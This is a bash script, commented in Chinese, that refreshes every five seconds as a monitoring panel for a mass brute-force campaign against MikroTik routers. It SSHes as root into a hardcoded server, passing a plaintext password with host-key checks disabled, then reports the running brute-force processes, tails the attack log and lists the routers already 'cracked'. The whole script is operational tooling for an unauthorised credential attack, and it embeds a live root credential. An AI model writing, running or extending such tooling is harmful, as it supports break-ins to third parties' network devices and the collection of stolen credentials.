#!/bin/bash
# MikroTik 批量爆破实时监控脚本

TARGET_IP="82.29.71.156"
TARGET_USER="root"
TARGET_PASS='@admin123'

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

while true; do
    clear
    echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}         MikroTik 批量爆破 - 实时监控面板${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # 运行进程数
    PROCS=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'ps aux | grep www_bruteforce | grep -v grep | wc -l' 2>/dev/null)
    echo -e "${BLUE}[+] 运行进程:${NC} ${GREEN}${PROCS}${NC} 个"
    
    # 成功破解数
    SUCCESS=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'find /root/mikrotik_ecsrp5_toolkit/results/ -type f -exec cat {} \; | sort -u | wc -l' 2>/dev/null)
    echo -e "${BLUE}[+] 成功破解:${NC} ${GREEN}${SUCCESS}${NC} 个路由器"
    
    # 最新日志
    echo -e "\n${YELLOW}━━━━━━━━━━━━━━━━ 最新日志 ━━━━━━━━━━━━━━━━${NC}"
    sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'tail -15 /root/mikrotik_ecsrp5_toolkit/www_brute_log_20251021_145440.txt' 2>/dev/null
    
    # 最新成功破解
    echo -e "\n${GREEN}━━━━━━━━━━━━━━━━ 已破解列表 ━━━━━━━━━━━━━━━━${NC}"
    sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'find /root/mikrotik_ecsrp5_toolkit/results/ -type f -exec cat {} \; | sort -u' 2>/dev/null | head -20
    
    echo -e "\n${BLUE}[i] 按 Ctrl+C 退出监控${NC}"
    echo -e "${BLUE}[i] 每5秒自动刷新...${NC}"
    
    sleep 5
done
